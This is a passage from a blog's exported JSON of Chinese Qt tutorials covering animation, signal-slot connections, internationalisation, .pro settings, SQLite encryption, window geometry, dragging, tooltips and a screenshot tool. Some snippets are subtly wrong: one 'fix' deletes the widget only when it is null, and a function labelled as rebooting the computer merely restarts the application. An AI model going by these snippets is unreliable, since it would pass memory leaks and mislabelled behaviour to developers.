//如果正在动画，那么return if(m_bAnimation) &#123; return; &#125; m_bAnimation = true; m_nWidgetCount = count(); int nIndex = currentIndex(); //计算下一页的索引 m_nNextIndex = (nIndex + 1) % m_nWidgetCount; //隐藏当前的widget widget(nIndex)-&gt;hide(); //开始动画并设置间隔和开始、结束值 QRect g = geometry(); int x = g.x(); int width = g.width(); m_pAnimPrty-&gt;setStartValue(width); m_pAnimPrty-&gt;setEndValue(0); m_pAnimPrty-&gt;setDuration(m_nDuration); m_pAnimPrty-&gt;start(); Q_UNUSED(x)&#125;","tags":[{"name":"动画","slug":"动画","permalink":"http://example.com/tags/%E5%8A%A8%E7%94%BB/"},{"name":"QStackWidget","slug":"QStackWidget","permalink":"http://example.com/tags/QStackWidget/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"动画","slug":"B-Code/Qt/动画","permalink":"http://example.com/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"Qt 因为槽函数问题或者逻辑问题导致重复new问题解决办法及建议","date":"2023-10-27T01:24:02.321Z","path":"B_Code/Qt/内存/重复new问题/","text":"[toc] 槽函数中重复 new这个问题比骄常见，举一个简单的例子： 12345678connect(timer, &amp;QTimer::timeout, this, &amp;this::slotCreateItem);void slotCreateItem()&#123; QWidget *widget = new QWidget();&#125;timer-&gt;start(1000); 上边只是为了说明一下类似的这种情况，由于一些特殊原因导致的槽函数中会多次触发 new 操作。 解决办法 设置为成员变量，在进入函数时，先执行 delete ，再去 new 123456789void slotCreateItem()&#123; if(nullptr == m_widget) &#123; delete m_widget; m_widget = nullptr; &#125; m_widget = new QWidget();&#125; 第二种办法就是设置控件属性 12345void slotCreateItem()&#123; QWidget *widget = new QWidget(); widget-&gt;setAttribute(WA_DeleteOnClose);&#125; 槽函数多次绑定问题123456connect(timer, &amp;QTimer::timeout, this, &amp;this::slotCreateItem);void slotCreateItem()&#123; connect(timer, &amp;QTimer::timeout, this, &amp;this::slotRePaint); // 每进入一次就会绑定一次，每绑定一次，触发次数就会增加一次&#125; 解决办法使用 Qt 的第五个参数控制。将上述代码改为以下形式 1connect(timer, &amp;QTimer::timeout, this, &amp;this::slotRePaint, Qt::UniqueConnection); // （modify）每进入一次就会绑定一次，每绑定一次，触发次数就会增加一次 Qt::UniqueConnection：这是一个标记，可以使用位或与上述任何一种连接类型结合使用。当 Qt::UniqueConnection 被设置后，如果连接已经存在，QObject::connect() 将会失败(即，如果相同的信号已经为同一对对象连接到相同的槽位)。这个标志是在Qt 4.6中引入的。 以下为 Qt 第五个参数各个含义： 常量 值 描述 Qt::AutoConnection 0 (默认)如果接收器位于发出信号的线程中，则使用Qt::DirectConnection。否则，使用Qt::QueuedConnection。连接类型是在信号发出时确定的。 Qt::DirectConnection 1 发出信号时立即调用插槽。槽在信令线程中执行。 Qt::QueuedConnection 2 当控制返回到接收方线程的事件循环时，将调用插槽。插槽在接收方的线程中执行。 Qt::BlockingQueuedConnection 3 与Qt::QueuedConnection相同，除了信令线程阻塞直到插槽返回。如果接收端位于信令线程中，则绝不能使用此连接，否则应用程序将死锁。 Qt::UniqueConnection 0x80 这是一个标记，可以使用位或与上述任何一种连接类型结合使用。当Qt::UniqueConnection被设置后，如果连接已经存在，QObject::connect()将会失败","tags":[{"name":"new","slug":"new","permalink":"http://example.com/tags/new/"},{"name":"内存","slug":"内存","permalink":"http://example.com/tags/%E5%86%85%E5%AD%98/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"内存","slug":"B-Code/Qt/内存","permalink":"http://example.com/categories/B-Code/Qt/%E5%86%85%E5%AD%98/"}]},{"title":"Qt 国际化","date":"2023-10-27T01:24:02.319Z","path":"B_Code/Qt/中英文切换/","text":"支持国际化是软件发布的基本项。现阶段我所在的项目也是有了这一需求，基于Qt实现这一需求也相对比较简单。 [toc] # Qt支持国际化Qt安装时，带了一个 Qt Linguist 的软件，这个软件就是 Qt 用来实现软件翻译的工具。在 Qt 中，所有的输入不见和文本绘制方式对Qt支持的所有语言都提供了内置的支持。Qt内置的字体引擎可以在同一时间正确而且精确地绘制不同的文本，这些文本可以包含来自众多不同书写系统的字符。 # 使用 Qt Linguist 翻译工具tr()函数在Qt中编写代码时要对需要显示的字符串调用 tr() 函数，完成代码编写后对这个应用程序的翻译主要包含以下几个步骤： 使用tr()函数 -&gt; 修改pro文件 -&gt; 更新语言文件 -&gt; 发布语言文件 -&gt; 使用语言文件（QTranslator）","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt pro文件用法","date":"2023-10-27T01:24:02.318Z","path":"B_Code/Qt/pro文件用法/","text":"[toc] 宏判断12345if(contains(DEFINES,OEM_Config)) &#123; FORMS += $$PWD/Form.ui HEADERS += $$PWD/Form.h SOURCES += $$PWD/Form.cpp&#125; pro文件转vcproj之后的配置 常规项 1234# 设置工具集为$(DefaultPlatformToolset)# 设置sdk版本$([Microsoft.Build.Utilities.ToolLocationHelper]::GetLatestSDKTargetPlatformVersion(&#x27;Windows&#x27;, &#x27;10.0&#x27;)) 生成前事件 1call $(SolutionDir)prompt.bat prompt.bat 123456789101112131415@echo offecho -----------------------------------------------------echo [TrustAgent.pro] 文件有更新时，请重新生成当前工程echo 以下配置并不适用于所有人，如有编译报错，请自行修改。echo 1. Qt工具集默认配置为环境变量QtPath: 当前系统QtPath:[%QtPath%] （推荐 5.9.9_msvc2015）echo 2. 工具集默认配置为: $(DefaultPlatformToolset) （推荐 10.0.19041.0及以上）echo 3. SDK默认配置为: $([Microsoft.Build.Utilities.ToolLocationHelper]::GetLatestSDKTargetPlatformVersion(&#x27;Windows&#x27;, &#x27;10.0&#x27;)) （推荐 V142）echo -----------------------------------------------------@REM if &quot;%QtPath%&quot; == &quot;&quot; (@REM choice /c:yn /m &quot;当前未配置环境变量，是否打开系统配置页面：&quot;@REM if %errorlevel%==1 (@REM start ms-settings:about@REM )@REM )","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"配置","slug":"配置","permalink":"http://example.com/tags/%E9%85%8D%E7%BD%AE/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt 重启","date":"2023-10-27T01:24:02.249Z","path":"B_Code/Qt/Qt重启/","text":"Qt 实现电脑重启（需要管理员）12345678inline void reboot()&#123; QString program = QApplication::applicationFilePath(); QStringList arguments = QApplication::arguments(); QString workingDirectory = QDir::currentPath(); QProcess::startDetached(program, arguments, workingDirectory); QApplication::exit();&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"SQLite3 数据库加密","date":"2023-10-27T01:24:02.249Z","path":"B_Code/Qt/SQLite加密/","text":"Set Connect options Provided by Qt SqlitePlugin QSQLITE_BUSY_TIMEOUT QSQLITE_OPEN_READONLY QSQLITE_OPEN_URI QSQLITE_ENABLE_SHARED_CACHE Added by QtCipherSqlitePlugin QSQLITE_CREATE_KEY QSQLITE_UPDATE_KEY QSQLITE_REMOVE_KEY 创建数据库密码 QSQLITE_CREATE_KEY如果输出中有 SQLITECIPHER 的名字，那么恭喜你，插件没有问题！为没有加密的数据库增加密码Qt 默认提供的 SQLite 插件是没有加密功能的。新版本的 QtCipherSqlitePlugin 支持为原本没有加密的数据库增加密码，使用方法如下：C++ 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_CREATE_KEY&quot;); if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; 上面的代码，我们使用 test.db 数据库，将密码设置为 test，同时指定连接选项为 QSQLITE_CREATE_KEY 。此时，调用 open() 函数之后，QtCipherSqlitePlugin 将使用改密码为这个数据库进行加密。 删除数据库密码 QSQLITE_REMOVE_KEYQtCipherSqlitePlugin 可以删除数据库密码，此时需要提供原密码，并使用连接选项 QSQLITE_REMOVE_KEY ，如下： 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_REMOVE_KEY&quot;);if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; 更新数据库密码 QSQLITE_UPDATE_KEYQtCipherSqlitePlugin 可以更新数据库原有密码，需要设置原密码，并且使用连接选项 QSQLITE_UPDATE_KEY 设置新密码，具体代码如下： 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_UPDATE_KEY=newtest&quot;); if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; 如果原密码不正确，QtCipherSqlitePlugin 会直接返回错误。 如果新密码设置为空，例如 QSQLITE_UPDATE_KEY= ，则作用等同于删除密码。 1234567891011121314151617bool QUpdateDB::setDBConfig(QSqlDatabase* dbconn, QMap&lt;ENUM_SQLKEY, QString&gt; qMapCfg)&#123; for (auto it : qMapCfg.toStdMap()) &#123; if (it.first &lt;= QSQLITE_REMOVE_KEY) &#123; dbconn-&gt;setPassword(it.second); dbconn-&gt;setConnectOptions(GETOBJNAME(it.first)); &#125; else if (it.first == QSQLITE_UPDATE_KEY) &#123; dbconn-&gt;setPassword(it.second); dbconn-&gt;setConnectOptions(QString(&quot;%1=%2&quot;).arg().arg()); &#125; &#125;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"SQLite3","slug":"SQLite3","permalink":"http://example.com/tags/SQLite3/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"开源","slug":"开源","permalink":"http://example.com/tags/%E5%BC%80%E6%BA%90/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt获取控件位置","date":"2023-10-27T01:24:02.248Z","path":"B_Code/Qt/Qt获取控件位置/","text":"Qt 获取窗口、系统屏幕大小尺寸信息，Qt获取控件位置坐标、屏幕坐标，相对父窗体坐标 [toc] 一、获取窗口大小尺寸信息Qt 窗口尺寸，窗口大小和大小改变引起的事件 QResizeEvent。 .vstqvnxeauui{zoom:80%;float:left;} .mutjgedtaduh{float: left;} 涉及坐标、长宽的接口12345678910111213//窗口左上角的位置(含边框)qDebug() &lt;&lt; this-&gt;frameGeometry().x() &lt;&lt; this-&gt;frameGeometry().y() &lt;&lt; ;//1qDebug() &lt;&lt; this-&gt;x() &lt;&lt; this-&gt;y();//2qDebug() &lt;&lt; this-&gt;pos().x() &lt;&lt; this-&gt;pos().y();//3//窗口的宽度和高度(含边框)qDebug() &lt;&lt; this-&gt;frameGeometry().width() &lt;&lt; this-&gt;frameGeometry().height();//窗口左上角的位置(不含边框)qDebug() &lt;&lt; this-&gt;geometry().x() &lt;&lt; this-&gt;geometry().y();//窗口的宽度和高度(不含边框)qDebug() &lt;&lt; this-&gt;geometry().width() &lt;&lt; this-&gt;geometry().height();//1qDebug() &lt;&lt; this-&gt;width() &lt;&lt; this-&gt;height();//2qDebug() &lt;&lt; this-&gt;rect().width() &lt;&lt; this-&gt;rect().height();//3qDebug() &lt;&lt; this-&gt;size().width() &lt;&lt; this-&gt;size().height();//4 Qt获取系统屏幕大小QDesktopWidget 提供了详细的位置信息，其能够自动返回窗口在用户窗口的位置和应用程序窗口的位置。 1234567QDesktopWidget* pDesktopWidget = QApplication::desktop();//获取可用桌面大小QRect deskRect = QApplication::desktop()-&gt;availableGeometry();//获取主屏幕分辨率QRect screenRect = QApplication::desktop()-&gt;screenGeometry();//获取屏幕数量int nScreenCount = QApplication::desktop()-&gt;screenCount(); Qt5开始， QDesktopWidget官方不建议使用，改为 QScreen 12345678#include&lt;QScreen&gt;#include&lt;QRect&gt; QList&lt;QScreen *&gt; list_screen = QGuiApplication::screens(); //多显示器QRect rect = list_screen.at(0)-&gt;geometry();desktop_width = rect.width();desktop_height = rect.height();qDebug() &lt;&lt; desktop_width &lt;&lt;desktop_height; 三、设置窗体大小1234567void setGeometry(int x, int y, int w, int h)void setGeometry(const QRect &amp;)void resize(int w, int h)void resize(const QSize &amp;) 四、Qt获取控件位置坐标、屏幕坐标、相对父窗体坐标 这个只是返回相对这个 widget （重载了QMouseEvent的widget）的位置。 1QPoint QMouseEvent::pos() 窗口坐标，这个是返回鼠标的全局坐标 1QPoint QMouseEvent::globalPos() 相对显示器的全局坐标 1QPoint QCursor::pos() [static] 将窗口坐标转换成显示器坐标 1QPoint QWidget::mapToGlobal(const QPoint &amp; pos) const 将显示器坐标转换成窗口坐标 1QPoint QWidget::mapFromGlobal(const QPoint &amp; pos) const 将窗口坐标获得的pos转成父类widget的坐标 1QPoint QWidget::mapFromParent(const QPoint &amp; pos) const 将当前窗口坐标转换成指定parent坐标 1QPoint QWidget::mapTo(const QWidget * parent, const QPoint &amp;pos) const 这个属性获得的是当前目前控件在父窗口中的位置 1const QPointF &amp;QMouseEvent::screenPos() const Returns the position of the mouse cursor asa QPointF, relative to the screen that received the event.和 QPoint QMouseEvent::globalPos() 值相同，但是类型更高精度的 QPointFThis function was introduced in Qt 5.0. 1const QPointF &amp;QMouseEvent::screenPos() const 获取全局坐标 1QCursor::pos() == QMouseEvent::globalPos() 将鼠标的坐标转换成全局坐标 1QMouseEvent::globalPos() == ui.posBtn-&gt;mapToGlobal(ui.posBtn-&gt;pos()); 将鼠标坐标（鼠标当前坐标，QCursor::pos()）直接转换成当前窗口相对坐标 1ui.posBtn-&gt;mapFromGlobal(QCursor::pos());","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt实现窗口拖拽","date":"2023-10-27T01:24:02.247Z","path":"B_Code/Qt/Qt窗口拖拽/","text":"[toc] QT窗口默认可以直接鼠标点住窗口的标题栏实现拖拽移动，如果需要鼠标点住窗口客户区域实现窗口的拖拽移动，可以通过QMouseEvent事件来实现。 .h文件12345678910111213141516171819202122#include &lt;QWidget&gt; class QMouseEvent;class Widget : public QWidget&#123; Q_OBJECT public: Widget(QWidget *parent = 0); ~Widget(); protected: //拖拽窗口 void mousePressEvent(QMouseEvent *event); void mouseMoveEvent(QMouseEvent *event); void mouseReleaseEvent(QMouseEvent *event); private: bool m_bDrag; QPoint mouseStartPoint; QPoint windowTopLeftPoint;&#125;; .cpp文件123456789101112131415161718192021222324252627282930313233//拖拽操作void Widget::mousePressEvent(QMouseEvent *event)&#123; if(event-&gt;button() == Qt::LeftButton) &#123; m_bDrag = true; //获得鼠标的初始位置 mouseStartPoint = event-&gt;globalPos(); //mouseStartPoint = event-&gt;pos(); //获得窗口的初始位置 windowTopLeftPoint = this-&gt;frameGeometry().topLeft(); &#125;&#125; void Widget::mouseMoveEvent(QMouseEvent *event)&#123; if(m_bDrag) &#123; //获得鼠标移动的距离 QPoint distance = event-&gt;globalPos() - mouseStartPoint; //QPoint distance = event-&gt;pos() - mouseStartPoint; //改变窗口的位置 this-&gt;move(windowTopLeftPoint + distance); &#125;&#125; void Widget::mouseReleaseEvent(QMouseEvent *event)&#123; if(event-&gt;button() == Qt::LeftButton) &#123; m_bDrag = false; &#125;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"拖拽","slug":"拖拽","permalink":"http://example.com/tags/%E6%8B%96%E6%8B%BD/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt 窗口居中显示","date":"2023-10-27T01:24:02.247Z","path":"B_Code/Qt/Qt窗口居中/","text":"一、进行界面布局的时候，往往需要将界面显示在整个桌面的中心位置，所以需要进行一下处理 二、加上头文件 1#include &lt;QDesktopWidget&gt; 三、再在构造函数中加上代码 12QDesktopWidget *deskdop=QApplication::desktop();move((deskdop-&gt;width()-this-&gt;width())/2, (deskdop-&gt;height()-this-&gt;height())/2);","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"布局","slug":"布局","permalink":"http://example.com/tags/%E5%B8%83%E5%B1%80/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt 鼠标 hover 操作时弹出文字气泡","date":"2023-10-27T01:24:02.246Z","path":"B_Code/Qt/Qt气泡/","text":"[TOC] 需求描述：鼠标 hover 在一个控件上时，展示设置好的气泡信息 演示 相关说明Qt5之前的版本要设置气泡需要通过C++中其他的类库去实现，在Qt5中则已经实现了相关的Qt类。并且除了设置文字气泡之外，还可以通过重写 QToolTip 类实现自己需要的气泡样式。 从 Qt 5.9.9 已经支持 QToolTip。基本所有继承于 QWidget 的组件都可以通过 setToolTip()设置气泡信息。以下所展示的Qt基类都可以设置气泡信息。 setToolTip: QAction QGraphicsItem QListWidgetItem QStandardItem QSystemTrayIcon QTableWidgetItem QTextCharFormat QTreeWidgetItem QWidget QWinThumbnailToolButton setToolTipDuration: QWidget setToolTipsVisible: QMenu 基本上所有继承于 QWidget 的Qt控件类都支持设置气泡，本文以 QLabel 和 QPushButton 为例演示文字气泡功能。 支持 SetToolTip的控件 代码代码很简单，在ui界面拖一个 QLabel 和一个 QPushbutton 即可，信号槽直接在ui界面右击转到槽即可。 1234567891011121314151617181920212223242526272829303132#include &quot;widget.h&quot;#include &quot;ui_widget.h&quot;#include &lt;QImage&gt;#include &lt;QPixmap&gt;Widget::Widget(QWidget *parent) : QWidget(parent) , ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); QPixmap img(&quot;:/Win11.jpg&quot;); ui-&gt;label-&gt;setPixmap(img); ui-&gt;label-&gt;setScaledContents(true); ui-&gt;label-&gt;setToolTip(QString(&quot;壁纸《Win11.png》&quot;)); ui-&gt;pushButton-&gt;setToolTip(QString(&quot;隐藏或显示图片&quot;));&#125;Widget::~Widget()&#123; delete ui;&#125;void Widget::on_pushButton_clicked()&#123; if(ui-&gt;label-&gt;isVisible()) ui-&gt;label-&gt;hide(); else ui-&gt;label-&gt;setVisible(true);&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"气泡","slug":"气泡","permalink":"http://example.com/tags/%E6%B0%94%E6%B3%A1/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt 截图","date":"2023-10-27T01:24:02.245Z","path":"B_Code/Qt/Qt截图/","text":"转载自： QT 截图 - 灰信网（软件开发博客聚合） (freesion.com) QT 截图 一、简要说明 简单的实现截图功能，包括全屏截图，矩形区域截图，主要环境：win7-32bit，QT Creator5.2。 工程源代码 链接：https://pan.baidu.com/s/1xt-oyaz4pWNNFG4q85nmSA 密码：6uky 二、效果运行效果 1、 全屏截图1234567891011//获取全屏截图 QPixmapfullScreen = QPixmap::grabWindow(QApplication::desktop()-&gt;winId()); //打开文件对话框 QStringfileName = QFileDialog::getSaveFileName(this, &quot;文件另存为&quot;,&quot;&quot;,tr(&quot;ConfigFiles (*.jpg)&quot;)); //保存截图 fullScreen.save(fileName,&quot;jpg&quot;); 2、 矩形截图：在全屏截图的基础上，在全屏截图选取一个矩形区域1234567fullScreen.copy(rect).save(fileName);//rect是一个矩形 或者是fullScreen.copy(x,y,width,height).save(fileName);//x,y为矩形左上角坐标， width为矩形宽度，height为矩形的高度。 需要注意的是 屏幕左上角为（0,0），x,y分别向右、下递增。 那么如何实现任意的矩形区域呢？ 四、改进1、 任意矩形区域 按下鼠标左键不放得到一个点P(x1,y1) 拖动鼠标 释放鼠标左键得到另外一个点Q(x2,y2) 如此得到一个以P、Q为对角的矩形 2、 实现动态矩形效果 拉上一层半透明的遮罩(其实就是一个半透明的showFullScreen窗体) 注意：拉上遮罩之前应将父窗体隐去，不然每一张全屏截图都会有父窗体 1setWindowState(Qt::WindowMinimized);//最小化父窗体。 （可能需要延时） 将矩形局域重绘(达到去除矩形区域部分的遮罩的效果) 3、 右键菜单(复制到剪切板+另存为+退出)以及增加快捷键 复制到剪切板：QGuiApplication::clipboard()-&gt;setPixmap(fullScreen.copy(rect)); **组合快捷键Ctrl+C：**if(****e-&gt;key()&#x3D;&#x3D;Qt::Key_C&amp;&amp;e-&gt;modifiers()&#x3D;&#x3D;Qt::ControlModifier) 4、 矩形截图时，实时显示鼠标的位置、矩形截图的位置以及大小信息 通过鼠标移动事件(设置鼠标轨迹跟踪：setMouseTracking(true); update()触发paintEvent重绘事件 5、 无边框窗体拖动123456789101112//实现无边框 (Qt::FramelessWindowHint去边框) 、Qt::WindowStaysOnTopHint窗体置顶 防止拖到任务栏下面 this-&gt;setWindowFlags(Qt::FramelessWindowHint| Qt::WindowSystemMenuHint |Qt::WindowMinMaxButtonsHint|Qt::WindowStaysOnTopHint); //拖动(实际上是根据鼠标的移动 来移动窗体) //当前鼠标相对窗体的位置-刚按下左键时的相对位置=鼠标移动的大小 move(e-&gt;pos()-beginPos+this-&gt;pos()); //鼠标移动的大小+窗体原来的位置=窗体移动后的位置 6、 窗体贴边(当窗体靠在屏幕上边，并且鼠标离开窗体时，窗体贴边，当鼠标进入窗体时，窗体全部展示)1234567891011//窗体贴边if(this-&gt;pos().y()&lt;=0)//窗体贴在屏幕上边&#123; move(pos().x(),-29);//贴边&#125; //窗体弹出if(this-&gt;pos().y()&lt;=0)//鼠标进入并且已经贴边&#123; move(pos().x(),0);//弹出整个窗体&#125; 五、工程结构 六、源文件screen.h文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#ifndef SCREEN_H#define SCREEN_H #include &lt;QWidget&gt;#include &lt;QPoint&gt;#include &lt;QMouseEvent&gt;#include &lt;QContextMenuEvent&gt;#include &lt;QMenu&gt;//右键菜单#include &lt;QPaintEvent&gt;#include &lt;QPainter&gt;//画笔#include &lt;QPixmap&gt;#include &lt;QDebug&gt;#include &lt;QDesktopWidget&gt;#include &lt;QApplication&gt;#include &lt;QFileDialog&gt;#include &lt;QShowEvent&gt;#include &lt;QClipboard&gt;#include &lt;QKeyEvent&gt;#include &lt;QRect&gt;#include &lt;QFile&gt; class Screen : public QWidget&#123; Q_OBJECTpublic: explicit Screen(QWidget *parent = 0); signals: public slots: void saveScreenOther();//截图另存为 void grapFullScreen();//全屏截图 void copyScreen(); //右键复制到粘贴板protected: void contextMenuEvent(QContextMenuEvent *); //--右键菜单事件 void mousePressEvent(QMouseEvent *e); //--鼠标按下事件 void mouseMoveEvent(QMouseEvent *e); //--鼠标移动事件 void mouseReleaseEvent(QMouseEvent *e); //--鼠标释放（松开）事件 void paintEvent(QPaintEvent *); //--画图事件 void showEvent(QShowEvent *); //--窗体show事件 void keyPressEvent(QKeyEvent *e); //--按键事件 private: QPoint beginPos;//记录鼠标的起始位置 QPoint endPos;//记录鼠标的结束位置 QMenu *menu; //右键菜单对象 bool leftPres;//记录鼠标左键是否按下，按下为true QRect * rect; //矩形截图区域public: QPixmap fullScreen;//全屏截图 public: QPoint getBeginPos();//获取鼠标的起始位置 QPoint getEndPos();//获取鼠标的结束位置 void setBeginPos(QPoint p);//设置鼠标的起始位置 void setEndPos(QPoint p);//设置鼠标的结束位置 &#125;; #endif // SCREEN_H widgets.h文件 12345678910111213141516171819202122232425262728293031323334353637383940#ifndef WIDGET_H#define WIDGET_H #include &lt;QWidget&gt; namespace Ui &#123;class Widget;&#125; class Widget : public QWidget&#123; Q_OBJECT public: explicit Widget(QWidget *parent = 0); ~Widget(); private slots: void on_pushButton_clicked(); void on_pushButton_2_clicked(); void on_pushButton_4_clicked(); void on_pushButton_3_clicked(); protected: void enterEvent(QEvent *e); //--鼠标进入事件 void leaveEvent(QEvent *e); //--鼠标离开事件 void mousePressEvent(QMouseEvent *e); //--鼠标按下事件 void mouseMoveEvent(QMouseEvent *e); //--鼠标移动事件 void mouseReleaseEvent(QMouseEvent *e); //--鼠标释放（松开）事件private: Ui::Widget *ui;private: bool leftPress; QPoint beginPos;&#125;; #endif // WIDGET_H screen.cpp文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181#include &quot;screen.h&quot; Screen::Screen(QWidget *parent) : QWidget(parent)&#123; beginPos = QPoint(-1,-1); endPos = beginPos; leftPres = false; setMouseTracking(true);//开启鼠标实时追踪，实时的显示鼠标的位置 rect = new QRect(0,0,QApplication::desktop()-&gt;width(),QApplication::desktop()-&gt;height()); menu = new QMenu(this);//创建右键菜单 menu-&gt;addAction(&quot;复制(CTRL+C)&quot;, this, SLOT(copyScreen())); menu-&gt;addAction(&quot;截图另存为(ALT+C)&quot;, this, SLOT(saveScreenOther())); menu-&gt;addAction(&quot;全屏截图(ALT+A)&quot;, this, SLOT(grapFullScreen())); menu-&gt;addAction(&quot;退出截图(ESC)&quot;, this, SLOT(hide()));&#125; void Screen::copyScreen() //右键复制到粘贴板&#123; QGuiApplication::clipboard()-&gt;setPixmap(fullScreen.copy(*rect));&#125;void Screen::contextMenuEvent(QContextMenuEvent *) //右键菜单事件&#123; this-&gt;setCursor(Qt::ArrowCursor); menu-&gt;exec(cursor().pos());&#125;void Screen::mousePressEvent(QMouseEvent *e) //--鼠标按下事件&#123; if (e-&gt;button() == Qt::LeftButton)//鼠标左键按下 &#123; leftPres = true; setBeginPos(e-&gt;pos());//鼠标相对窗体的位置 &#125; &#125;void Screen::mouseMoveEvent(QMouseEvent *e) //--鼠标移动事件&#123; if(leftPres) &#123; setEndPos(e-&gt;pos()); &#125; update();//重绘、触发画图事件 &#125;void Screen::mouseReleaseEvent(QMouseEvent *e) //--鼠标释放（松开）事件&#123; leftPres = false; setEndPos(e-&gt;pos()); //使得起始点在左上角，结束点在右下角 if(beginPos.x()&gt;endPos.x()) &#123; beginPos.setX(beginPos.x() + endPos.x()); endPos.setX(beginPos.x() - endPos.x()); beginPos.setX(beginPos.x() - endPos.x()); &#125; if(beginPos.y()&gt;endPos.y()) &#123; beginPos.setY(beginPos.y() + endPos.y()); endPos.setY(beginPos.y() - endPos.y()); beginPos.setY(beginPos.y() - endPos.y()); &#125; rect-&gt;setRect(beginPos.x(),beginPos.y(),endPos.x()-beginPos.x(),endPos.y()-beginPos.y()); &#125; QPoint Screen::getBeginPos()//获取鼠标的起始位置&#123; return beginPos;&#125;QPoint Screen::getEndPos()//获取鼠标的结束位置&#123; return endPos;&#125;void Screen::setBeginPos(QPoint p)//设置鼠标的起始位置&#123; this-&gt;beginPos = p;&#125;void Screen::setEndPos(QPoint p)//设置鼠标的结束位置&#123; this-&gt;endPos = p;&#125; void Screen::paintEvent(QPaintEvent *) //--画图事件 &#123; QPainter painter(this); //将当前窗体对象设置为画布 QPen pen; pen.setColor(Qt::red);//设置笔色 pen.setWidth(1); //画笔线条宽度 painter.setPen(pen);//设置画笔 int lx = beginPos.x()&lt;endPos.x()?beginPos.x():endPos.x();//矩形截图区域左上角x坐标 int ly = beginPos.y()&lt;endPos.y()?beginPos.y():endPos.y();//矩形截图区域右上角x坐标 int w = beginPos.x()&lt;endPos.x()?endPos.x()-beginPos.x():beginPos.x()-endPos.x();//矩形截图区域宽度 int h = beginPos.y()&lt;endPos.y()?endPos.y()-beginPos.y():beginPos.y()-endPos.y();//矩形截图区域高度 QRect rect = QRect(lx,ly,w,h);//矩形截图区域 if(lx!=-1 &amp;&amp; w&gt;0 &amp;&amp; h&gt;0)//防止第一次就重绘 并且宽高大于0时才进行截图操作 &#123; painter.drawPixmap(rect,fullScreen,rect);//重绘截图矩形部分，即恢复原图，达到去除幕布效果 painter.drawRect(lx, ly, w, h);//画截图矩形 //截图区域大小位置提示 if(ly&gt;10)//避免看不到提示,在截图矩形上边不接近屏幕上边时，提示在截图矩形的上边的上面 &#123; painter.drawText(lx + 2, ly - 8, tr(&quot;截图范围(%1,%2) - (%3,%4) 截图大小：(%5 